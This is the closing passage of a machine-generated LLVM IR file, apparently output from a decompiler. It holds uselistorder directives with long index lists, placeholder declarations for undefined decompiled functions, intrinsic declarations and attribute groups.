  uselistorder i32* @r0, { 26, 27, 28, 319, 320, 260, 254, 255, 256, 257, 258, 259, 29, 31, 261, 100, 262, 5, 101, 263, 264, 98, 99, 265, 30, 32, 266, 267, 268, 269, 116, 33, 117, 118, 34, 35, 270, 271, 272, 273, 274, 275, 25, 276, 277, 36, 6, 171, 173, 103, 172, 2, 184, 183, 45, 185, 37, 186, 187, 188, 7, 38, 39, 321, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 201, 202, 203, 213, 214, 215, 216, 217, 218, 219, 220, 221, 106, 235, 119, 236, 237, 238, 240, 239, 18, 19, 207, 278, 279, 121, 122, 322, 325, 326, 120, 40, 323, 324, 241, 242, 243, 244, 250, 41, 130, 131, 132, 20, 327, 21, 43, 175, 3, 176, 22, 23, 44, 8, 209, 47, 280, 281, 95, 96, 282, 283, 284, 97, 285, 286, 287, 48, 288, 289, 291, 292, 49, 75, 174, 177, 178, 179, 180, 181, 182, 50, 51, 123, 124, 125, 146, 70, 147, 71, 52, 53, 54, 328, 329, 331, 110, 111, 112, 113, 55, 293, 294, 9, 56, 57, 332, 333, 10, 58, 59, 228, 229, 11, 60, 61, 114, 115, 330, 200, 62, 133, 134, 135, 136, 126, 127, 249, 63, 107, 108, 245, 12, 246, 247, 248, 204, 104, 205, 206, 105, 64, 230, 231, 232, 233, 234, 157, 65, 158, 224, 66, 225, 222, 67, 223, 226, 68, 227, 164, 69, 165, 251, 42, 77, 295, 296, 297, 46, 72, 208, 79, 298, 299, 300, 13, 14, 301, 302, 15, 17, 0, 1, 303, 304, 16, 305, 306, 307, 74, 109, 308, 309, 310, 311, 312, 73, 313, 24, 314, 315, 4, 316, 290, 128, 129, 210, 211, 212, 317, 166, 76, 167, 78, 137, 138, 139, 140, 141, 102, 142, 143, 144, 145, 148, 149, 150, 151, 152, 153, 154, 155, 156, 159, 160, 161, 162, 163, 168, 169, 170, 252, 253, 318, 80, 81, 82, 83, 91, 92, 93, 94, 84, 85, 86, 87, 88, 89, 90 }
  uselistorder void (i32)* @__pseudo_branch, { 16, 108, 101, 102, 103, 104, 105, 106, 107, 109, 110, 111, 0, 83, 84, 85, 93, 96, 55, 56, 57, 112, 53, 54, 97, 17, 18, 19, 20, 21, 22, 113, 118, 119, 120, 121, 122, 123, 124, 114, 128, 129, 130, 131, 41, 42, 23, 24, 25, 94, 95, 47, 48, 49, 50, 51, 52, 89, 115, 116, 117, 1, 33, 34, 35, 26, 27, 28, 29, 30, 31, 44, 45, 46, 125, 126, 127, 90, 91, 92, 64, 65, 66, 86, 87, 88, 132, 71, 72, 73, 74, 75, 76, 67, 68, 69, 70, 36, 37, 77, 78, 38, 39, 98, 99, 32, 79, 80, 81, 82, 58, 59, 60, 61, 62, 63, 40, 43, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 100 }
  uselistorder i32 0, { 431, 430, 480, 481, 1530, 435, 434, 482, 1531, 1532, 1533, 1534, 376, 375, 483, 1535, 1536, 251, 1537, 1539, 1540, 178, 179, 1541, 1542, 1538, 105, 106, 107, 108, 2, 1, 3, 0, 240, 239, 241, 242, 243, 1543, 432, 433, 169, 158, 1544, 1545, 245, 246, 244, 247, 1546, 1547, 1548, 1549, 250, 249, 248, 1550, 1551, 1552, 422, 421, 484, 436, 485, 437, 486, 438, 487, 488, 489, 180, 1553, 452, 451, 1554, 1555, 450, 449, 1556, 490, 447, 448, 445, 446, 444, 443, 1557, 442, 441, 440, 439, 381, 1558, 1574, 1559, 254, 1560, 1561, 1562, 1563, 1564, 1565, 256, 1567, 1568, 252, 253, 1569, 1570, 153, 181, 1571, 1572, 627, 109, 110, 423, 424, 255, 1566, 1573, 380, 1575, 491, 492, 1576, 454, 453, 257, 1577, 1578, 258, 1579, 1580, 1581, 132, 493, 494, 1582, 259, 1583, 1584, 1585, 260, 1586, 1587, 1588, 1589, 1590, 1591, 1592, 1593, 1594, 1595, 34, 154, 495, 1596, 261, 1597, 1598, 1599, 4, 1600, 1601, 5, 1602, 1603, 6, 1213, 7, 1214, 1215, 628, 471, 472, 1216, 1217, 1218, 1219, 1220, 1221, 1222, 9, 10, 11, 1223, 1224, 8, 1225, 1226, 629, 12, 1227, 1228, 35, 630, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 1236, 125, 124, 262, 263, 264, 1237, 1238, 1239, 13, 1240, 1241, 36, 1242, 1243, 1244, 37, 38, 232, 1245, 1246, 1247, 1248, 39, 233, 496, 1249, 1250, 1251, 1252, 1253, 1254, 40, 1255, 15, 14, 41, 631, 1256, 633, 632, 1257, 1258, 1259, 1260, 1261, 16, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 634, 707, 1262, 1263, 1264, 1265, 1266, 17, 1267, 635, 1268, 1269, 1270, 1271, 234, 235, 497, 1272, 1273, 19, 18, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 636, 637, 1281, 639, 1282, 1283, 640, 641, 1284, 1285, 638, 1286, 642, 1287, 643, 1288, 1289, 1290, 1291, 20, 1604, 1605, 1606, 170, 1607, 1608, 1609, 1610, 1611, 265, 1612, 644, 647, 645, 646, 1613, 648, 871, 872, 53, 54, 881, 882, 873, 874, 875, 876, 877, 878, 879, 880, 883, 890, 885, 886, 887, 888, 267, 889, 266, 917, 268, 924, 925, 926, 159, 927, 160, 928, 161, 929, 162, 930, 269, 931, 932, 1292, 1293, 933, 935, 936, 938, 937, 270, 939, 940, 21, 171, 1614, 498, 1615, 941, 271, 942, 943, 273, 274, 133, 134, 944, 272, 945, 946, 947, 948, 182, 183, 949, 950, 951, 275, 952, 953, 425, 954, 955, 499, 956, 957, 958, 959, 960, 961, 962, 111, 963, 964, 135, 992, 993, 994, 995, 996, 997, 382, 998, 999, 1000, 1010, 1001, 1067, 1096, 1097, 1098, 1009, 184, 185, 1099, 455, 415, 416, 500, 1100, 1101, 1102, 1104, 1105, 1106, 1107, 42, 1108, 1109, 55, 383, 426, 1110, 1111, 1112, 1113, 1116, 1117, 1122, 1125, 1127, 1128, 276, 1129, 649, 1130, 1114, 1103, 650, 377, 651, 1115, 1132, 1133, 1134, 56, 1161, 57, 1160, 186, 1162, 1163, 277, 708, 709, 710, 711, 712, 136, 713, 714, 278, 715, 43, 279, 716, 501, 717, 718, 417, 280, 281, 502, 503, 283, 1164, 1165, 1166, 1167, 1168, 282, 284, 504, 505, 1169, 1170, 1171, 1172, 285, 506, 1173, 507, 58, 59, 60, 61, 473, 286, 1174, 163, 1175, 288, 287, 508, 509, 766, 767, 384, 172, 1011, 1012, 1013, 1014, 1015, 1294, 1295, 1296, 1297, 1298, 1299, 289, 126, 418, 1300, 1301, 1302, 112, 1016, 510, 1017, 1018, 1019, 1303, 652, 1304, 1305, 1306, 511, 1307, 1308, 1309, 653, 1310, 1311, 1314, 1315, 456, 457, 722, 723, 512, 934, 513, 719, 729, 730, 22, 514, 720, 187, 515, 1616, 1617, 1618, 23, 24, 188, 189, 190, 1623, 1624, 191, 25, 721, 192, 193, 299, 298, 295, 294, 297, 296, 293, 291, 292, 290, 918, 919, 920, 921, 516, 1176, 1177, 1195, 300, 1196, 1200, 1201, 1202, 1203, 1204, 301, 1205, 194, 1206, 1207, 1208, 1209, 303, 302, 304, 1210, 305, 768, 769, 155, 62, 1625, 113, 385, 1629, 1630, 63, 891, 137, 892, 893, 894, 386, 195, 1626, 1627, 1628, 387, 196, 654, 1316, 64, 197, 1317, 1318, 388, 198, 655, 390, 1319, 65, 156, 1320, 1321, 389, 1631, 1632, 1633, 1634, 1635, 1638, 1639, 1640, 1641, 1642, 1643, 1644, 1645, 1646, 1647, 1636, 1637, 1648, 1649, 1650, 1651, 1652, 1653, 1654, 1655, 44, 1656, 1657, 1658, 1659, 1660, 45, 1661, 1662, 1663, 46, 1664, 1665, 1666, 47, 1667, 1668, 1669, 1670, 1671, 1672, 1673, 1674, 1675, 1676, 1677, 1678, 1679, 1680, 1681, 1682, 1683, 1684, 1685, 1686, 1687, 1688, 1689, 1690, 1693, 1694, 1695, 1696, 1697, 1698, 1699, 1691, 1692, 1700, 1701, 1702, 1703, 1704, 1705, 1706, 1707, 1708, 1709, 48, 1710, 1711, 1712, 1713, 1714, 49, 1715, 1716, 1717, 1718, 1719, 50, 1720, 1721, 1722, 1723, 1724, 1725, 1726, 1727, 1728, 1729, 1730, 1731, 1732, 1733, 1734, 1020, 1021, 1055, 517, 518, 1056, 1057, 895, 656, 896, 897, 898, 899, 1322, 1323, 1324, 1325, 1344, 307, 1345, 1346, 1347, 1348, 1349, 1350, 1351, 1352, 1353, 1354, 1355, 1356, 200, 199, 308, 309, 1357, 1358, 1359, 1360, 1361, 1362, 201, 202, 1363, 1364, 1365, 1366, 1367, 1368, 51, 1369, 1370, 1371, 1372, 1373, 66, 310, 1374, 203, 520, 1375, 1376, 1377, 1378, 1379, 521, 311, 1380, 1381, 1382, 1383, 463, 1384, 1385, 1386, 462, 1387, 1388, 461, 1389, 1390, 306, 1391, 519, 1392, 313, 1393, 52, 1394, 458, 427, 1395, 1396, 1397, 522, 523, 1398, 1399, 1400, 459, 460, 1401, 1402, 1403, 312, 1404, 1405, 1406, 1407, 1408, 1409, 1410, 26, 1411, 1412, 1413, 657, 1414, 1415, 1416, 1417, 1418, 1419, 1421, 1420, 1422, 1423, 1424, 1425, 1426, 1427, 1428, 1429, 1430, 1431, 1432, 1433, 1438, 1439, 1437, 1434, 1435, 1436, 27, 391, 1441, 1440, 392, 1442, 1443, 204, 1444, 314, 316, 922, 315, 923, 317, 884, 205, 900, 905, 906, 901, 902, 903, 908, 909, 910, 318, 911, 912, 913, 914, 915, 904, 907, 916, 206, 724, 725, 726, 319, 727, 728, 207, 320, 731, 735, 736, 737, 738, 321, 732, 322, 733, 734, 208, 739, 770, 1735, 1736, 1737, 1619, 1620, 1621, 323, 1622, 811, 810, 1178, 1002, 838, 740, 741, 1738, 1739, 1740, 1741, 1742, 1743, 742, 1744, 324, 1745, 1746, 1747, 1135, 1136, 211, 325, 419, 420, 524, 1752, 661, 1753, 525, 1754, 1755, 526, 1756, 1757, 659, 326, 394, 1758, 660, 1759, 527, 114, 1760, 1761, 528, 1770, 1771, 1774, 658, 393, 1775, 464, 210, 209, 1772, 1773, 1748, 1749, 662, 327, 378, 686, 28, 29, 1768, 1445, 1769, 1131, 812, 164, 813, 663, 328, 814, 815, 1762, 1763, 1764, 1765, 529, 1766, 212, 833, 834, 165, 743, 744, 664, 745, 530, 746, 747, 748, 749, 750, 67, 68, 138, 751, 69, 70, 139, 1312, 1313, 127, 396, 858, 855, 856, 665, 857, 859, 666, 860, 861, 862, 863, 71, 72, 140, 864, 329, 865, 866, 867, 869, 868, 395, 687, 689, 688, 330, 690, 691, 692, 531, 693, 213, 1750, 1751, 982, 983, 984, 985, 986, 987, 332, 214, 988, 989, 990, 166, 331, 991, 755, 756, 532, 752, 215, 753, 216, 754, 333, 771, 772, 773, 30, 849, 217, 218, 219, 167, 757, 220, 221, 534, 535, 1767, 533, 222, 223, 1190, 1191, 1192, 1193, 1194, 334, 1184, 1185, 1186, 1187, 1188, 1189, 335, 1179, 536, 1180, 1181, 537, 1182, 1183, 224, 1003, 538, 336, 1004, 1005, 1006, 1007, 1008, 225, 1137, 1138, 340, 338, 339, 1139, 1140, 346, 345, 237, 337, 1141, 1142, 1143, 1144, 1145, 1146, 429, 428, 465, 539, 1147, 1148, 1149, 115, 1150, 342, 341, 343, 344, 236, 1151, 1152, 397, 1153, 1154, 176, 1155, 1156, 1157, 1158, 1159, 1126, 816, 830, 829, 1121, 1120, 1119, 1118, 840, 1124, 1123, 841, 843, 842, 1211, 1068, 347, 348, 349, 1446, 1447, 351, 1448, 1449, 350, 1450, 352, 1451, 1452, 398, 1453, 1197, 1198, 1199, 31, 1776, 1777, 141, 540, 353, 1454, 1455, 1456, 1457, 1458, 354, 1058, 667, 1059, 1060, 226, 227, 358, 1022, 356, 1023, 1044, 1037, 668, 1038, 1039, 1040, 1041, 73, 74, 144, 1042, 1043, 399, 1045, 1046, 669, 1047, 355, 1048, 75, 76, 143, 1049, 1050, 670, 1051, 1052, 77, 78, 142, 1053, 357, 1054, 1024, 671, 1025, 1026, 541, 1027, 1028, 672, 1029, 1030, 1033, 1031, 1032, 400, 1034, 79, 80, 146, 1035, 673, 81, 82, 145, 1036, 774, 674, 775, 776, 777, 778, 779, 1061, 675, 1062, 1063, 1064, 1065, 1066, 780, 676, 781, 782, 783, 784, 785, 1459, 1460, 1461, 1462, 1463, 228, 1464, 1465, 1466, 1467, 1469, 1470, 1468, 1471, 229, 1472, 1475, 1473, 1474, 359, 542, 1476, 1477, 1478, 360, 361, 1479, 1480, 1481, 1482, 1483, 1484, 543, 1485, 1486, 544, 1487, 1489, 362, 1488, 401, 379, 1490, 1491, 1493, 230, 1494, 364, 1495, 119, 120, 117, 118, 1496, 545, 173, 168, 1497, 1498, 1499, 367, 365, 366, 546, 1500, 1501, 1502, 116, 363, 1503, 1504, 1505, 1506, 1507, 1508, 1509, 1510, 1511, 547, 174, 413, 128, 1512, 1513, 1514, 32, 368, 694, 695, 177, 121, 157, 1492, 402, 759, 758, 405, 761, 762, 760, 403, 404, 763, 764, 548, 765, 1072, 1073, 677, 1074, 1075, 1076, 678, 1077, 1078, 83, 84, 147, 1079, 1080, 1081, 122, 123, 1082, 1083, 1084, 369, 1085, 1086, 1087, 1088, 1089, 549, 1090, 1091, 1092, 1093, 1094, 238, 1515, 1095, 965, 679, 966, 967, 85, 86, 149, 968, 969, 970, 680, 971, 972, 973, 974, 681, 975, 976, 87, 88, 148, 977, 978, 979, 980, 981, 550, 370, 786, 551, 845, 844, 835, 1069, 1070, 1071, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 33, 1326, 1327, 1328, 1329, 175, 1330, 371, 1331, 1332, 1333, 1334, 1335, 1336, 1337, 372, 682, 685, 683, 684, 1338, 1339, 1340, 1341, 1342, 1343, 553, 558, 798, 799, 800, 89, 150, 552, 90, 406, 559, 801, 91, 129, 556, 557, 92, 130, 560, 561, 555, 407, 562, 554, 563, 802, 803, 804, 806, 414, 805, 807, 808, 566, 567, 564, 565, 809, 575, 568, 571, 569, 572, 570, 573, 817, 574, 576, 818, 819, 820, 577, 821, 231, 822, 93, 411, 410, 823, 824, 94, 409, 408, 825, 95, 96, 97, 98, 99, 100, 101, 578, 826, 579, 582, 827, 580, 581, 583, 828, 584, 466, 585, 831, 586, 832, 837, 102, 131, 836, 467, 588, 589, 587, 839, 590, 373, 592, 593, 594, 846, 595, 847, 596, 597, 591, 412, 598, 848, 599, 600, 602, 850, 851, 601, 852, 853, 103, 151, 152, 854, 603, 374, 104, 870, 604, 1212, 1516, 1517, 474, 1518, 1519, 475, 1520, 1521, 476, 1522, 1523, 477, 1524, 1525, 478, 1526, 1527, 479, 1528, 1529, 468, 696, 469, 470, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 1778, 1779, 1780, 1781, 1782, 1783, 1784, 1785, 1786, 1787, 1788, 1789, 1790, 1791, 1792 }
  uselistorder i32* @r4, { 88, 730, 731, 732, 733, 734, 752, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 14, 749, 750, 751, 753, 754, 755, 756, 757, 69, 758, 759, 605, 15, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 89, 90, 91, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 267, 17, 268, 16, 269, 270, 271, 272, 63, 276, 303, 304, 305, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 326, 327, 328, 329, 330, 331, 332, 760, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 5, 370, 371, 372, 373, 374, 375, 376, 377, 378, 18, 379, 380, 452, 401, 402, 403, 483, 484, 485, 404, 405, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 503, 511, 519, 520, 521, 522, 546, 547, 548, 549, 6, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 19, 21, 105, 20, 106, 550, 551, 552, 553, 556, 2, 554, 555, 11, 59, 557, 562, 563, 558, 559, 560, 561, 12, 632, 406, 22, 407, 408, 409, 23, 410, 411, 412, 413, 414, 415, 416, 633, 634, 417, 418, 419, 420, 635, 637, 24, 638, 639, 111, 112, 325, 107, 761, 108, 109, 110, 70, 763, 764, 765, 8, 768, 762, 306, 307, 308, 564, 565, 566, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 156, 157, 158, 159, 160, 161, 769, 770, 277, 278, 25, 7, 279, 453, 454, 455, 456, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 421, 422, 423, 424, 425, 442, 26, 443, 444, 280, 281, 282, 283, 284, 640, 641, 27, 642, 643, 644, 28, 645, 29, 646, 647, 648, 649, 650, 9, 657, 0, 658, 659, 3, 30, 651, 652, 653, 654, 660, 1, 309, 310, 311, 312, 273, 274, 275, 285, 286, 287, 31, 288, 289, 290, 32, 291, 292, 293, 294, 295, 296, 60, 297, 298, 299, 300, 301, 302, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 13, 123, 124, 125, 126, 766, 767, 201, 202, 203, 204, 205, 206, 381, 382, 787, 788, 789, 71, 790, 791, 792, 523, 524, 67, 795, 61, 796, 797, 798, 811, 813, 814, 815, 812, 799, 804, 809, 810, 793, 805, 806, 807, 808, 207, 208, 10, 33, 209, 34, 210, 211, 212, 800, 801, 72, 35, 127, 36, 128, 129, 130, 636, 77, 78, 79, 80, 81, 82, 794, 145, 146, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 162, 163, 164, 165, 166, 253, 254, 167, 168, 169, 170, 171, 172, 141, 142, 143, 144, 147, 148, 255, 256, 257, 258, 259, 260, 802, 803, 149, 150, 151, 152, 567, 573, 587, 588, 574, 575, 576, 577, 578, 579, 580, 581, 582, 37, 583, 584, 585, 586, 568, 569, 570, 571, 572, 383, 384, 385, 386, 387, 388, 389, 390, 391, 38, 392, 393, 394, 395, 396, 397, 398, 399, 400, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 64, 538, 539, 4, 540, 541, 542, 543, 544, 545, 213, 214, 228, 229, 230, 233, 234, 235, 231, 232, 504, 505, 506, 507, 508, 509, 510, 496, 497, 498, 499, 500, 501, 502, 512, 513, 514, 515, 516, 517, 518, 238, 239, 240, 241, 242, 243, 244, 602, 603, 604, 457, 458, 459, 460, 461, 462, 463, 468, 469, 661, 662, 663, 664, 39, 665, 666, 667, 668, 669, 65, 670, 671, 672, 673, 674, 40, 445, 446, 447, 73, 426, 427, 429, 41, 430, 431, 42, 432, 433, 43, 434, 435, 44, 436, 437, 45, 438, 439, 46, 440, 66, 441, 74, 428, 173, 174, 47, 175, 176, 448, 449, 48, 450, 451, 177, 178, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 49, 717, 718, 719, 720, 721, 83, 84, 85, 704, 705, 68, 62, 706, 655, 656, 153, 154, 155, 470, 471, 472, 473, 474, 50, 475, 51, 52, 476, 477, 478, 479, 480, 481, 482, 722, 723, 724, 356, 357, 53, 358, 359, 54, 360, 361, 55, 362, 363, 56, 364, 365, 57, 366, 367, 58, 368, 369, 179, 180, 181, 182, 245, 246, 247, 250, 251, 252, 248, 249, 464, 465, 466, 467, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 236, 237, 75, 76, 261, 262, 263, 264, 265, 266, 725, 726, 727, 728, 86, 87, 729 }
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i16 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8** @__decompiler_undefined_function_4() local_unnamed_addr

declare i64* @__decompiler_undefined_function_5() local_unnamed_addr

declare %vfp_regs @__decompiler_undefined_function_6() local_unnamed_addr

declare %anon_struct_4 @__decompiler_undefined_function_7() local_unnamed_addr

declare %anon_struct_13.3 @__decompiler_undefined_function_8() local_unnamed_addr

declare %anon_struct_13 @__decompiler_undefined_function_9() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
